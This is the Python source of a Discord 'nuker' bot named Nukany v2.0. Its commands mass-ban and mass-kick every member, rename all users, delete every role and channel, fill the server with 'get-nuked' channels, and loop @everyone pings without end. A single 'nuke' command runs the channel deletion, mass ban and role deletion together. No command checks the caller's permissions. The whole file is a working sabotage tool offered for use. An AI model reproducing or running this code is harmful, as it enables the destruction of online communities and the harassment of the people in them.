import asyncio
import datetime
import discord
import time
from discord import Embed
from discord.ext import commands

intents = discord.Intents.all()
client = commands.Bot(command_prefix="sudo ", intents=intents)
client.remove_command("help")


async def status_task():
    while True:
        await client.change_presence(activity=discord.Game(name="🕒 Try: sudo uptime"))


@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))
    global startTime
    startTime = time.time()
    client.loop.create_task(status_task())


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Please pass in all required arguments.")


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("This command does not exist / Invalid command used")


# Shows you the bot's uptime
@client.command()
async def uptime(ctx):
    await ctx.message.delete()
    uptime = str(datetime.timedelta(seconds=int(round(time.time() - startTime))))
    embed = discord.Embed(title="Bot Uptime", description=f"`Bot has been up for {uptime}`")
    await ctx.send(embed=embed)


# Kick everyone from the guild
@client.command(Name=["kick all"])
async def kickall(ctx):
    await ctx.message.delete()
    await ctx.send('Kicking all members!')
    for member in ctx.guild.members:
        try:
            await member.kick()
        except:
            continue
    await ctx.send("Done!")


# Ban everyone from the guild
@client.command(Name=["ban all"])
async def banall(ctx):
    await ctx.message.delete()
    await ctx.send('Banning all members!')
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            continue
    await ctx.send("Done!")


# Rename everyone in the guild
@client.command()
async def allrename(ctx, *, nick):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nick)
        except:
            continue
    await ctx.send("Done!")


# Command used for spam creating/deleting roles
@client.command()
async def role(ctx, choice):
    await ctx.message.delete()
    if choice == 'create':
        for i in range(1, 11):
            await ctx.guild.create_role(name=f'Spam Role {i}')
        await ctx.send("Done!")
    elif choice == 'delete':
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print(f"{role.name} has been deleted <Role>")
            except:
                continue
        await ctx.send("Done!")
    else:
        await ctx.send('Not valid option...')


# Command used for spam creating/deleting channels
@client.command()
async def channel(ctx, choice):
    await ctx.message.delete()
    if choice == 'create':
        print('Spam creating channels...')
        for i in range(1, 31):
            await ctx.guild.create_text_channel(name=f'get-nuked')
        await ctx.send("Done!")
    elif choice == 'delete':
        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
                print(f"{channel.name} has been deleted <Channel>")
            except:
                continue
        guild = ctx.message.guild
        channel = await guild.create_text_channel("get-nuked")
        await channel.send(
            "In the real world trust doesnt mean trust, trust is just another way people manipulate you in to doing "
            "what they want.")
    else:
        await ctx.send('Not valid option...')


# Spam a specific word/phrase
@client.command()
async def spam(ctx, number, *, word):
    await ctx.message.delete()
    number = (int(number)) + 1
    for x in range(1, (int(number))):
        await ctx.send(word)
        await asyncio.sleep(1)


# Unstoppable ping that pings everyone in the server in every single channel, rate limit denied!
@client.command()
async def massping(ctx, advert=None):
    await ctx.message.delete()
    if advert is None:
        advert = ""
    while True:
        for channel in ctx.guild.channels:
            if channel.name == channel.name:
                await channel.send("@everyone" + advert)
                await channel.send("@everyone" + advert)
                await channel.send("@everyone" + advert)
                await channel.send("@everyone" + advert)
                await channel.send("@everyone" + advert)
        for i in range(1, 5):
            await ctx.guild.create_text_channel(name=f'get-nuked')


# All-in-one bomber command
@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    # Delete channel
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted from {ctx.guild.name} <Channel>")
        except:
            continue
    # Ban all members
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(f"{member.name}#{member.discriminator} has been banned <Member>")
        except:
            continue

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"{role.name} has been deleted <Role>")
        except:
            continue


# Invite the bot to your server! (jk pls dont do it)
@client.command()
async def invite(ctx):
    await ctx.message.delete()
    embed = Embed(
        title="```DO NOT: Invite the bot to your guild, anyone can use the commands with or without perms.```",
        description="[Click here for bot invite link!](https://discord.com/api/oauth2/authorize?client_id=860531846235160636&permissions=8&scope=bot)",
        colour=discord.Colour.blurple())
    await ctx.send(embed=embed)


# Self explanatory, help panel
@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed = Embed(title="Nukany v2.0: Help Panel",
                  description="*Parameters surrounded by <> is optional, [] is required.*",
                  colour=discord.Colour.blurple())

    embed.set_author(name=ctx.message.author, icon_url=ctx.author.avatar_url)
    embed.add_field(name='sudo uptime', value='`Uptime of bot`', inline=False)
    embed.add_field(name='sudo kickall', value='`Kicks every member in the server`', inline=False)
    embed.add_field(name='sudo banall', value='`Bans every member in the server`', inline=False)
    embed.add_field(name='sudo allrename', value='`Rename all the user in the server`', inline=False)
    embed.add_field(name='sudo role [create/delete]', value='`Deletes all excisting role / Creates roles`', inline=False)
    embed.add_field(name='sudo channel [create/delete]', value='`Creates 10 channels`', inline=False)
    embed.add_field(name='sudo spam [amount/number] [word/phrase]', value='`Spams your desired phrase in the chat`',
                    inline=False)
    embed.add_field(name='sudo massping <advert/phrase>',
                    value='`Spams your desired advertisement/phrase in every single channel non-stop`', inline=False)
    embed.add_field(name='sudo nuke', value='`Completely annihilate the guild', inline=False)
    embed.add_field(name='sudo invite', value='`Invite Quotany Version Nuke to your server. Beware, ANYONE can use the '
                                          'commands`', inline=False)
    embed.set_footer(text="Made with 💔 hatred 💔 by stampixel")
    await ctx.author.send(embed=embed)


client.run('TOKEN')


